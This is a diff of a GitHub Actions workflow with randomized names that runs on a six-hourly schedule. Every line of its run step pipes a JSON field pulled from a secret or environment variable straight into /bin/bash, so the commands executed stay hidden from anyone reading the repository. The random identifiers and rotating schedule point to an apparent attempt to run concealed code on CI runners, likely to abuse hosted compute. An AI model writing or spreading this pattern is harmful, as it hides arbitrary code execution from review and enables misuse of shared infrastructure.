@@ -2,28 +2,26 @@ name: meihaxi2513
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 5/6 * * *'
-jobs:  # 12313
+    - cron: '48 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: meihaxi2513
         env:
-          rdeu3: ${{ secrets.rdeu3 }}
+          vb255: ${{ secrets.vb255 }}
         run: |
-          echo $rdeu3 | jq -r .vu998 | /bin/bash
-          echo $blisq31 | jq -r .hyt40 | /bin/bash
-          echo $huesz823 | jq -r .ls300 | /bin/bash
-          echo $uac8 | jq -r .jil9 | /bin/bash
-          echo $nhrg95374 | jq -r .jxyj2318 | /bin/bash
-          echo $f59550 | jq -r .zqc7 | /bin/bash
-          echo $tc5 | jq -r .qpbux794 | /bin/bash
-          echo $nqcjl53 | jq -r .dzv2 | /bin/bash
-          echo $dofxz565 | jq -r .qo9819 | /bin/bash
-          echo $yz4228 | jq -r .aa28 | /bin/bash
-          echo $vc8507 | jq -r .qwxs387 | /bin/bash
-          echo $p23620 | jq -r .bfkk6155 | /bin/bash
-          echo $ucmtn89019 | jq -r .poxt028 | /bin/bash
-          echo $vtc7723 | jq -r .qk1 | /bin/bash
+          echo $vb255 | jq -r .nk55 | /bin/bash
+          echo $m473 | jq -r .xid51 | /bin/bash
+          echo $cutrk79196 | jq -r .n5 | /bin/bash
+          echo $w4 | jq -r .wx7933 | /bin/bash
+          echo $rnmmc0322 | jq -r .nptxq0389 | /bin/bash
+          echo $ir232 | jq -r .bfyu965 | /bin/bash
+          echo $pp8038 | jq -r .pm2067 | /bin/bash
+          echo $q3500 | jq -r .k324 | /bin/bash
+          echo $v636 | jq -r .gq5 | /bin/bash
+          echo $k3 | jq -r .l49365 | /bin/bash
 
